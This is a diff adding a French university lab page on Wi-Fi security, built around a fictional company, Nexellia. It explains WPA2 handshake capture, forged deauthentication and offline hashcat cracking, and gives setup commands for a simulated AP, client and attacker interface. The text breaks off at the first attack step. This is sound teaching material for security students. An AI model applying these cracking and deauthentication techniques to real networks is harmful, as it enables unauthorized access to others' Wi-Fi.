@@ -1,0 +1,1422 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SWFE837 – Sécurité Wi‑Fi (2026) – Mission Nexellia</title>
+    <!-- Bootstrap 5 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ── Style original conservé à l'identique ── */
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; }
+        .sidebar {
+            background: #1e3c72; color: white; min-height: 100vh; padding: 20px 15px;
+            position: sticky; top: 0; z-index: 100;
+        }
+        .sidebar h4 { color: #ffc107; margin-bottom: 1.5rem; }
+        .sidebar .list-group-item {
+            background: transparent; border: none; color: rgba(255,255,255,0.8);
+            transition: 0.2s; border-radius: 8px; margin-bottom: 4px;
+        }
+        .sidebar .list-group-item:hover,
+        .sidebar .list-group-item.active { background: rgba(255,255,255,0.15); color: white; font-weight: 600; }
+        .main-content { padding: 30px 40px; }
+        .accordion-button { font-weight: 600; font-size: 1.1rem; background-color: #e9f0fb; }
+        .accordion-button:not(.collapsed) { background-color: #d0e2ff; color: #1e3c72; }
+        .accordion-body { background-color: white; border: 1px solid #dee2e6; border-top: none; }
+        pre { background: #272b30; color: #f8f9fa; padding: 15px; border-radius: 8px; }
+        .footer-note { text-align: center; margin-top: 30px; color: #6c757d; }
+        .analysis-box { background: #fff8e1; border-left: 5px solid #ffc107; padding: 15px; margin-top: 20px; border-radius: 4px; }
+        .diagram { text-align: center; margin: 20px 0; }
+        .diagram svg { max-width: 100%; height: auto; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
+
+        /* ── Composants guides détaillés ── */
+        .section-sub { font-size: .68rem; text-transform: uppercase; letter-spacing: .12em; font-weight: 700; color: #888; margin: 22px 0 10px; }
+
+        .theory-box { background: #e8f0fb; border-left: 5px solid #1e3c72; padding: 15px 18px; border-radius: 4px; margin: 12px 0 18px; }
+        .theory-box h6 { color: #1e3c72; font-weight: 700; margin-bottom: 8px; }
+        .theory-box p, .theory-box ul, .theory-box li { font-size: .87rem; color: #1a2e4a; }
+        .theory-box ul { margin-bottom: 0; }
+
+        .prereq-box { background: #f8f9fa; border: 1px solid #dee2e6; padding: 13px 16px; border-radius: 6px; margin-bottom: 18px; }
+        .prereq-box h6 { color: #495057; font-weight: 700; margin-bottom: 8px; font-size: .88rem; }
+        .prereq-box ul { font-size: .86rem; margin: 0; }
+
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 10px; margin: 10px 0 18px; }
+        .concept-card { background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 13px 14px; }
+        .concept-card .ct { font-weight: 700; font-size: .84rem; color: #1e3c72; margin-bottom: 5px; }
+        .concept-card p { font-size: .81rem; color: #555; margin: 0; line-height: 1.5; }
+
+        .step-list { list-style: none; padding: 0; margin: 0; }
+        .step-item { display: flex; gap: 14px; margin-bottom: 20px; }
+        .step-num { background: #1e3c72; color: #fff; min-width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: .78rem; flex-shrink: 0; margin-top: 2px; }
+        .step-body { flex: 1; }
+        .step-body h6 { font-size: .9rem; font-weight: 700; color: #1e3c72; margin-bottom: 5px; }
+        .step-body p { font-size: .86rem; color: #444; margin-bottom: 6px; }
+        .step-body pre { margin: 6px 0 4px; }
+        .step-output { background: #1a2e1a; color: #a8ff80; padding: 10px 14px; border-radius: 6px; font-family: 'Courier New', monospace; font-size: .79rem; line-height: 1.55; margin: 6px 0; white-space: pre; overflow-x: auto; }
+        .step-output-label { display: block; color: #6fcf6f; font-size: .66rem; text-transform: uppercase; letter-spacing: .08em; margin-bottom: 5px; }
+        .step-warn { background: #fff3e0; border-left: 3px solid #ff9800; padding: 8px 12px; border-radius: 4px; font-size: .82rem; color: #7c4a00; margin: 6px 0; }
+        .step-info { background: #e3f2fd; border-left: 3px solid #1976d2; padding: 8px 12px; border-radius: 4px; font-size: .82rem; color: #0d47a1; margin: 6px 0; }
+
+        .checkpoint-box { background: #e8f5e9; border: 2px solid #388e3c; border-radius: 8px; padding: 14px 18px; margin: 20px 0; }
+        .checkpoint-box h6 { color: #1b5e20; font-weight: 700; margin-bottom: 8px; }
+        .checkpoint-box li { font-size: .87rem; color: #1b5e20; }
+
+        .troubleshoot-box { background: #fff8e1; border-left: 5px solid #ff9800; padding: 15px 18px; border-radius: 4px; margin-top: 20px; }
+        .troubleshoot-box h6 { color: #7c4a00; font-weight: 700; margin-bottom: 10px; }
+        .tr-item { margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid #ffe0b2; font-size: .86rem; }
+        .tr-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+        .tr-prob { font-weight: 700; color: #c62828; margin-bottom: 3px; }
+        .tr-sol { color: #444; }
+        .tr-sol code { background: #272b30; color: #f8f9fa; padding: 1px 5px; border-radius: 3px; font-size: .79rem; }
+
+        /* ── Ajouts fil rouge (dans la même palette) ── */
+        .filrouge-hero {
+            background: #1e3c72; color: white;
+            border-radius: 10px; padding: 28px 30px;
+            margin-bottom: 28px;
+        }
+        .filrouge-hero h4 { color: #ffc107; margin-bottom: 6px; }
+        .filrouge-hero p { color: rgba(255,255,255,0.85); margin-bottom: 0; font-size: .95rem; line-height: 1.6; }
+        .filrouge-hero .incident-tag {
+            display: inline-block; font-size: .72rem; font-weight: 700;
+            border: 1px solid #ffc107; color: #ffc107;
+            padding: 2px 10px; border-radius: 4px; letter-spacing: .08em;
+            margin-bottom: 10px;
+        }
+        .filrouge-hero .meta-grid {
+            display: flex; gap: 24px; flex-wrap: wrap;
+            background: rgba(255,255,255,0.08); border-radius: 8px;
+            padding: 12px 16px; margin-top: 16px;
+        }
+        .filrouge-hero .meta-item .label { font-size: .68rem; color: #ffc107; text-transform: uppercase; letter-spacing: .08em; }
+        .filrouge-hero .meta-item .val   { font-size: .88rem; font-weight: 600; }
+        .mission-card {
+            background: #1e3c72; color: white;
+            border-left: 5px solid #ffc107; border-radius: 6px;
+            padding: 14px 18px; margin-bottom: 20px;
+        }
+        .mission-card .mission-label {
+            font-size: .68rem; text-transform: uppercase;
+            letter-spacing: .1em; color: #ffc107;
+            font-weight: 700; margin-bottom: 6px;
+        }
+        .mission-card p { color: rgba(255,255,255,0.9); font-size: .88rem; margin: 0; line-height: 1.6; }
+        .deliverable-box {
+            background: #e8f5e9; border-left: 5px solid #388e3c;
+            padding: 14px 18px; border-radius: 6px; margin-top: 20px;
+        }
+        .deliverable-box h6 { color: #1b5e20; font-weight: 700; margin-bottom: 8px; }
+        .deliverable-box ul { margin: 0; font-size: .88rem; color: #1b5e20; }
+        .phases-bar {
+            display: flex; border-radius: 8px; overflow: hidden; margin-top: 16px;
+        }
+        .phases-bar .ph {
+            flex: 1; padding: 8px 10px; text-align: center;
+            font-size: .75rem; font-weight: 600;
+        }
+        .ph-1 { background: rgba(220,38,38,.35); color: #fca5a5; }
+        .ph-2 { background: rgba(29,78,216,.4);  color: #bfdbfe; }
+        .ph-3 { background: rgba(217,119,6,.35); color: #fde68a; }
+        .ph-4 { background: rgba(5,150,105,.35); color: #a7f3d0; }
+        .ph .ph-num { font-size: .62rem; opacity: .75; display: block; }
+    </style>
+</head>
+<body>
+<div class="container-fluid">
+    <div class="row">
+
+        <!-- ════ SIDEBAR ════ -->
+        <nav class="col-md-3 col-lg-2 sidebar">
+            <h4><i class="fas fa-shield-alt me-2"></i>SWFE837</h4>
+            <p class="small mb-4">Sécurité Wi-Fi<br>Semestre 8 – 2026</p>
+            <div class="list-group" id="sidebar-nav">
+                <a class="list-group-item list-group-item-action" data-bs-toggle="collapse" href="#collapse0" role="button" aria-expanded="true">
+                    <i class="fas fa-tools me-2"></i> Mise en place du labo
+                </a>
+                <a class="list-group-item list-group-item-action" data-bs-toggle="collapse" href="#collapse1" role="button">
+                    <i class="fas fa-key me-2"></i> TP1 – Force brute WPA2
+                </a>
+                <a class="list-group-item list-group-item-action" data-bs-toggle="collapse" href="#collapse2" role="button">
+                    <i class="fas fa-lock me-2"></i> TP2 – WPA3‑Enterprise
+                </a>
+                <a class="list-group-item list-group-item-action" data-bs-toggle="collapse" href="#collapse3" role="button">
+                    <i class="fas fa-user-secret me-2"></i> TP3 – Evil Twin
+                </a>
+                <a class="list-group-item list-group-item-action" data-bs-toggle="collapse" href="#collapse4" role="button">
+                    <i class="fas fa-radar me-2"></i> TP4 – Détection IDS
+                </a>
+                <a class="list-group-item list-group-item-action" data-bs-toggle="collapse" href="#collapse5" role="button">
+                    <i class="fas fa-clipboard-check me-2"></i> Évaluation & portfolio
+                </a>
+            </div>
+        </nav>
+
+        <!-- ════ MAIN ════ -->
+        <main class="col-md-9 col-lg-10 main-content">
+
+            <!-- FIL ROUGE HERO -->
+            <div class="filrouge-hero">
+                <div class="incident-tag"><i class="fas fa-exclamation-triangle me-1"></i> INCIDENT CONFIRMÉ – RÉPONSE REQUISE</div>
+                <h4><i class="fas fa-building me-2"></i>Mission Nexellia SA</h4>
+                <p>Nexellia SA, fintech parisienne de 200 collaborateurs, vient de recevoir un rapport d'audit alarmant : des traces d'une attaque Wi-Fi ont été détectées dans leurs logs. La DSI ne sait pas comment l'attaque a été menée, ni comment s'en protéger. <strong>Vous êtes l'équipe de consultants mandatés pour investiguer, remédier et outiller.</strong></p>
+                <div class="meta-grid">
+                    <div class="meta-item"><div class="label">Client</div><div class="val">Nexellia SA</div></div>
+                    <div class="meta-item"><div class="label">Secteur</div><div class="val">Fintech · Paiement</div></div>
+                    <div class="meta-item"><div class="label">Effectif</div><div class="val">~200 collaborateurs</div></div>
+                    <div class="meta-item"><div class="label">Wi-Fi actuel</div><div class="val">WPA2-PSK · 12 AP</div></div>
+                </div>
+                <div class="phases-bar">
+                    <div class="ph ph-1"><span class="ph-num">TP1</span>Reproduire l'attaque</div>
+                    <div class="ph ph-2"><span class="ph-num">TP2</span>Sécuriser le réseau</div>
+                    <div class="ph ph-3"><span class="ph-num">TP3</span>Simuler l'Evil Twin</div>
+                    <div class="ph ph-4"><span class="ph-num">TP4</span>Déployer l'IDS</div>
+                </div>
+            </div>
+
+            <h2 class="mb-4"><i class="fas fa-route me-2"></i>Déroulé pas à pas</h2>
+            <p class="text-muted">Cliquez sur une section pour la déplier. Chaque TP contient objectifs, schéma d'architecture (SVG), commandes et questions d'analyse.</p>
+
+            <div class="accordion" id="mainAccordion">
+
+                <!-- ══ SÉANCE 0 ══ -->
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="heading0">
+                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse0" aria-expanded="true" aria-controls="collapse0">
+                            <i class="fas fa-tools me-2"></i> Mise en place du laboratoire (1h30)
+                        </button>
+                    </h2>
+                    <div id="collapse0" class="accordion-collapse collapse show" aria-labelledby="heading0" data-bs-parent="#mainAccordion">
+                        <div class="accordion-body">
+                            <h5>Objectifs</h5>
+                            <ul>
+                                <li>Importer la VM Kali (<code>Kali_SecWifi_Labo.ova</code>) dans VirtualBox</li>
+                                <li>Exécuter le script <code>install_labo.sh</code></li>
+                                <li>Vérifier avec <code>verif_labo.sh</code> (doit afficher "LABO OK")</li>
+                                <li>Créer un snapshot avant de commencer chaque TP</li>
+                            </ul>
+                            <h6>Ressources clés</h6>
+                            <pre>VM Kali_SecWifi_Labo.ova
+# Extraire le ZIP et entrer dans le dossier
+unzip swfe837_pack_complet.zip && cd swfe837/
+
+# Installation (à lancer depuis swfe837/)
+sudo bash scripts/install_labo.sh
+
+# Vérification
+sudo bash scripts/verif_labo.sh
+
+# Réinitialisation entre deux TP
+sudo bash scripts/reset_labo.sh</pre>
+                            <div class="alert alert-info small mt-3"><i class="fas fa-info-circle"></i> <strong>Conseil :</strong> faire un snapshot de la VM avant chaque TP. En cas de problème, restaurez en 30 secondes sans réinstaller.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ══ TP1 ══ -->
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="heading1">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse1" aria-expanded="false" aria-controls="collapse1">
+                            <i class="fas fa-key me-2"></i> TP1 – Attaque par force brute WPA2 (2h)
+                        </button>
+                    </h2>
+                    <div id="collapse1" class="accordion-collapse collapse" aria-labelledby="heading1" data-bs-parent="#mainAccordion">
+                        <div class="accordion-body">
+
+                            <div class="mission-card">
+                                <div class="mission-label"><i class="fas fa-search me-1"></i> Mission 1 · Comprendre l'exposition</div>
+                                <p>Le rapport d'audit de Nexellia indique : <em>"Le réseau WPA2-PSK peut être compromis en moins de 4 heures avec un matériel grand public."</em> La DSI doute de cette affirmation. Votre mission : <strong>reproduire l'attaque en laboratoire</strong> pour quantifier le risque réel et convaincre la direction de migrer.</p>
+                            </div>
+
+                            <!-- ── Objectifs ── -->
+                            <h5>Objectifs</h5>
+                            <ul>
+                                <li>Passer l'interface Wi-Fi en mode monitor</li>
+                                <li>Scanner les réseaux et identifier l'AP cible avec <code>airodump-ng</code></li>
+                                <li>Capturer un handshake WPA2 en forçant une désauthentification</li>
+                                <li>Cracker la clé hors ligne avec <code>hashcat</code></li>
+                                <li>Analyser les limites de WPA2 et l'apport de WPA3-SAE</li>
+                            </ul>
+
+                            <!-- ── Rappel théorique ── -->
+                            <div class="section-sub">Rappel théorique</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-book-open me-2"></i>Comment fonctionne l'attaque ?</h6>
+                                <p>WPA2-PSK repose sur un <strong>secret partagé</strong> (le mot de passe Wi-Fi). À chaque connexion d'un client, l'AP et le client échangent 4 trames EAPOL (<em>4-way handshake</em>) pour dériver une clé de session unique. Ces trames contiennent un <strong>dérivé du mot de passe</strong> (la PMK), qui circule sur l'air en clair de protocole.</p>
+                                <p>L'attaque se déroule en deux phases indépendantes :</p>
+                                <ul>
+                                    <li><strong>Phase passive (capture) :</strong> on écoute le canal Wi-Fi de l'AP cible et on attend qu'un client se connecte — ou on provoque sa reconnexion via une désauthentification forgée.</li>
+                                    <li><strong>Phase offline (crack) :</strong> on soumet le handshake capturé à <code>hashcat</code> qui teste des milliers de mots de passe par seconde sans jamais toucher au réseau. L'AP ne voit rien.</li>
+                                </ul>
+                            </div>
+
+                            <div class="concept-grid">
+                                <div class="concept-card">
+                                    <div class="ct">Mode monitor</div>
+                                    <p>Mode d'écoute passif : l'interface Wi-Fi capture toutes les trames dans l'air, sans être associée à un réseau. <code>airmon-ng</code> crée une interface <code>wlan0mon</code> dédiée.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">4-way handshake EAPOL</div>
+                                    <p>4 trames échangées à chaque connexion pour dériver la PTK. La trame 2 contient le MIC (Message Integrity Code), calculé à partir de la PMK — c'est ce qu'on capture pour cracker.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">PMKID</div>
+                                    <p>Identifiant dérivé de la PMK, diffusé par l'AP dans les trames beacon. Capturables <em>sans client</em>, donc sans désauthentification. Hashcat mode <code>-m 22000</code> gère les deux formats.</p>
+                                </div>
+                                <div class="concept-card">
+                                    <div class="ct">Désauthentification (802.11)</div>
+                                    <p>Trame de gestion non authentifiée (sans 802.11w). N'importe qui peut en forger une en usurpant le BSSID de l'AP, coupant le client pour provoquer sa reconnexion.</p>
+                                </div>
+                            </div>
+
+                            <!-- ── Prérequis ── -->
+                            <div class="section-sub">Prérequis</div>
+                            <div class="prereq-box">
+                                <h6><i class="fas fa-list-check me-2"></i>Vérifier avant de commencer</h6>
+                                <ul>
+                                    <li>Snapshot VirtualBox <em>"Avant_TP1"</em> créé</li>
+                                    <li>Script <code>verif_labo.sh</code> terminé sur LABO OK</li>
+                                    <li>4 interfaces virtuelles disponibles : <code>iw dev</code> liste <code>wlan0</code>, <code>wlan1</code>, <code>wlan2</code>, <code>wlan3</code></li>
+                                    <li>Wordlist présente : <code>ls /opt/wordlists/rockyou_small.txt</code></li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Affectation des interfaces ── -->
+                            <div class="section-sub">Affectation des interfaces pour ce TP</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-network-wired me-2"></i>Rôle de chaque interface</h6>
+                                <p>Avec <code>mac80211_hwsim</code>, la VM dispose de 4 interfaces Wi-Fi virtuelles qui communiquent entre elles dans un réseau radio simulé. Dans ce TP, chaque interface joue un rôle précis :</p>
+                                <ul>
+                                    <li><strong>wlan0</strong> → <span style="color:#b37700">AP (hostapd)</span> — simule l'infrastructure Nexellia vulnérable</li>
+                                    <li><strong>wlan1</strong> → <span style="color:#0d47a1">Client (wpa_supplicant)</span> — simule un collaborateur Nexellia connecté</li>
+                                    <li><strong>wlan2</strong> → <span style="color:#c62828">Attaquant (mode monitor)</span> — votre interface d'écoute et d'attaque</li>
+                                    <li><strong>wlan3</strong> → réservé pour le TP4 (IDS)</li>
+                                </ul>
+                                <p style="margin-top:8px"><strong>Règle :</strong> n'utilisez jamais <code>wlan2</code> pour l'AP ni <code>wlan0</code> en monitor — les étapes suivantes supposent strictement cette affectation.</p>
+                            </div>
+
+                            <!-- ── Mise en place de l'environnement cible ── -->
+                            <div class="section-sub">Partie A — Mise en place de l'environnement cible</div>
+                            <p class="small text-muted">Ouvrez <strong>3 terminaux</strong> en parallèle pour les parties A et B. Chaque terminal gardera un rôle tout au long du TP.</p>
+
+                            <ul class="step-list">
+                                <li class="step-item">
+                                    <div class="step-num">A1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 1 — Démarrer l'AP WPA2 (rôle Nexellia)</h6>
+                                        <p>Hostapd crée un vrai point d'accès Wi-Fi logiciel sur <code>wlan0</code>. Le fichier de configuration est fourni dans le labo.</p>
+                                        <pre>sudo hostapd /opt/swfe837/configs/hostapd-wpa2-tp1.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue — garder ce terminal ouvert</span>Configuration file: /opt/swfe837/configs/hostapd-wpa2-tp1.conf
+wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Ce terminal doit rester ouvert pendant tout le TP.</div>
+                                        <p>Avant de passer à A2, <strong>vérifiez dans un autre terminal</strong> que le SSID est bien visible :</p>
+                                        <pre>sudo iwlist wlan1 scan | grep NexelliaWifi</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>ESSID:"NexelliaWifi"</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> <strong>Ne lancez pas wpa_supplicant avant d'avoir ce résultat.</strong> Si le SSID est absent, hostapd n'est pas prêt — attendez quelques secondes et réessayez.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">A2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 2 — Lancer wpa_supplicant (foreground)</h6>
+                                        <p>On lance wpa_supplicant <strong>sans <code>-B</code></strong> : il tourne en foreground et affiche les événements en temps réel. <strong>L'AP doit être actif (étape A1) avant de lancer cette commande.</strong></p>
+                                        <pre># Remettre wlan1 up (systemctl stop NetworkManager peut l'avoir désactivée)
+sudo ip link set wlan1 up
+
+# Libérer les sockets résiduels
+sudo systemctl stop wpa_supplicant 2>/dev/null
+sudo pkill -9 wpa_supplicant 2>/dev/null
+sleep 1
+sudo rm -rf /run/wpa_supplicant/wlan1
+
+# Lancer en foreground (laisser ce terminal ouvert)
+sudo wpa_supplicant -i wlan1 -c /opt/swfe837/configs/wpa_supplicant-wpa2-tp1.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue dans ce terminal — connexion réussie</span>Successfully initialized wpa_supplicant
+nl80211: kernel reports: Match already configured
+[... messages nl80211 inoffensifs ...]
+wlan1: SME: Trying to authenticate with 02:00:00:00:00:00 (SSID='NexelliaWifi' freq=2437 MHz)
+wlan1: Trying to associate with 02:00:00:00:00:00 (SSID='NexelliaWifi' freq=2437 MHz)
+wlan1: Associated with 02:00:00:00:00:00
+wlan1: WPA: Key negotiation completed [PTK=CCMP GTK=CCMP]
+wlan1: CTRL-EVENT-CONNECTED - Connection to 02:00:00:00:00:00 completed</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Les messages <code>nl80211: kernel reports: Match already configured</code> sont des avertissements inoffensifs — ignorez-les et cherchez uniquement la ligne <code>CTRL-EVENT-CONNECTED</code>.</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> Si vous ne voyez pas <code>CTRL-EVENT-CONNECTED</code> après 10 secondes, vérifiez dans le Terminal 1 que hostapd affiche bien <code>AP-ENABLED</code>. Si hostapd n'est pas démarré, wpa_supplicant ne trouvera aucun AP à rejoindre.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">A3</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Vérifier la connexion</h6>
+                                        <p>Dans un nouveau terminal, confirmez que wlan1 est bien associé :</p>
+                                        <pre>iw dev wlan1 link</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Connected to 02:00:00:00:00:00 (on wlan1)
+        SSID: NexelliaWifi
+        freq: 2437
+        signal: -30 dBm</div>
+                                        <p>Dans le Terminal 1 (hostapd), vous devez également voir :</p>
+                                        <div class="step-output"><span class="step-output-label">Terminal hostapd</span>wlan0: STA 02:00:00:00:01:00 IEEE 802.11: authenticated
+wlan0: STA 02:00:00:00:01:00 IEEE 802.11: associated (aid 1)
+wlan0: AP-STA-CONNECTED 02:00:00:00:01:00</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> <strong>Notez la MAC du client</strong> (<code>02:00:00:00:01:00</code>) — vous en aurez besoin à l'étape B5 pour la désauthentification ciblée.</div>
+                                    </div>
+                                </li>
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Validation Partie A — avant de passer à l'attaque</h6>
+                                <ul>
+                                    <li>Terminal hostapd affiche <code>AP-ENABLED</code> et <code>AP-STA-CONNECTED</code></li>
+                                    <li><code>iw dev wlan1 link</code> affiche <code>Connected to ... SSID: NexelliaWifi</code></li>
+                                    <li>La MAC du client est notée (visible dans le terminal hostapd)</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Schéma ── -->
+                            <div class="section-sub">Architecture de l'attaque</div>
+                            <div class="diagram">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 350" width="800" height="350">
+                                    <defs>
+                                        <filter id="shadow" x="-2%" y="-2%" width="104%" height="104%">
+                                            <feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/>
+                                        </filter>
+                                        <marker id="arrowBlue" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
+                                        <marker id="arrowRed" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
+                                        <marker id="arrowOrange" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc9900"/></marker>
+                                        <marker id="arrowGreen" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#2e7d32"/></marker>
+                                    </defs>
+                                    <rect width="800" height="350" fill="#ffffff" rx="10" />
+                                    <text x="400" y="30" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#1e3c72">TP1 – Capture de handshake WPA2 &amp; crack hashcat</text>
+                                    <rect x="30" y="60" width="320" height="250" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10" />
+                                    <text x="190" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#2e7d32">Infrastructure légitime</text>
+                                    <rect x="60" y="110" width="100" height="60" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow)"/>
+                                    <text x="110" y="135" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#0d47a1">Client</text>
+                                    <text x="110" y="152" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">MAC: 00:11:22:33:44:55</text>
+                                    <text x="110" y="165" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">wlan0</text>
+                                    <rect x="220" y="110" width="120" height="60" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow)"/>
+                                    <text x="280" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#b37700">AP Nexellia</text>
+                                    <text x="280" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">SSID: NexelliaWifi</text>
+                                    <text x="280" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">WPA2-PSK / Canal 6</text>
+                                    <line x1="160" y1="140" x2="220" y2="140" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue)"/>
+                                    <text x="190" y="135" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">① Association</text>
+                                    <rect x="380" y="60" width="390" height="250" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10" />
+                                    <text x="575" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#c62828">Équipement attaquant</text>
+                                    <rect x="400" y="110" width="130" height="60" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow)"/>
+                                    <text x="465" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#b71c1c">Attaquant</text>
+                                    <text x="465" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">wlan0mon (monitor)</text>
+                                    <text x="465" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">airodump-ng</text>
+                                    <line x1="340" y1="125" x2="400" y2="125" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed)" stroke-dasharray="5,3"/>
+                                    <text x="370" y="119" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">② écoute</text>
+                                    <line x1="400" y1="155" x2="340" y2="155" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed)"/>
+                                    <text x="370" y="150" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">④ désauth</text>
+                                    <rect x="560" y="110" width="130" height="60" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow)"/>
+                                    <text x="625" y="130" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">capture.hc22000</text>
+                                    <text x="625" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">trames EAPOL</text>
+                                    <text x="625" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">+ PMKID</text>
+                                    <line x1="530" y1="140" x2="560" y2="140" stroke="#cc9900" stroke-width="2" marker-end="url(#arrowOrange)"/>
+                                    <text x="545" y="135" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc9900">③ stocke</text>
+                                    <rect x="420" y="215" width="120" height="40" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow)"/>
+                                    <text x="480" y="240" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">hashcat -m 22000</text>
+                                    <line x1="625" y1="170" x2="540" y2="215" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue)"/>
+                                    <text x="590" y="200" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">⑤ soumet</text>
+                                    <rect x="560" y="215" width="110" height="40" fill="#c8e6c9" stroke="#2e7d32" stroke-width="2" rx="20" filter="url(#shadow)"/>
+                                    <text x="615" y="240" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#1b5e20">🔑 Clé !</text>
+                                    <line x1="540" y1="235" x2="560" y2="235" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowGreen)"/>
+                                    <text x="400" y="342" text-anchor="middle" font-family="Arial" font-size="10" fill="#666">La désauthentification (④) force le client à se reconnecter, générant un nouveau handshake EAPOL capturé passivement.</text>
+                                </svg>
+                            </div>
+
+                            <!-- ── Guide pas à pas ── -->
+                            <div class="section-sub">Partie B — Attaque depuis le Terminal 3</div>
+                            <p class="small text-muted">Tous les éléments suivants s'exécutent dans le <strong>Terminal 3</strong> (rôle attaquant, interface <code>wlan2</code>). Les terminaux 1 et 2 doivent rester ouverts.</p>
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">B1</div>
+                                    <div class="step-body">
+                                        <h6>Tuer les processus qui bloquent l'interface</h6>
+                                        <p>NetworkManager utilise parfois <code>wlan2</code>. On le libère sans toucher aux terminaux 1 et 2.</p>
+                                        <pre>sudo airmon-ng check kill</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Killing these processes:
+  PID Name
+  953 wpa_supplicant
+  871 NetworkManager</div>
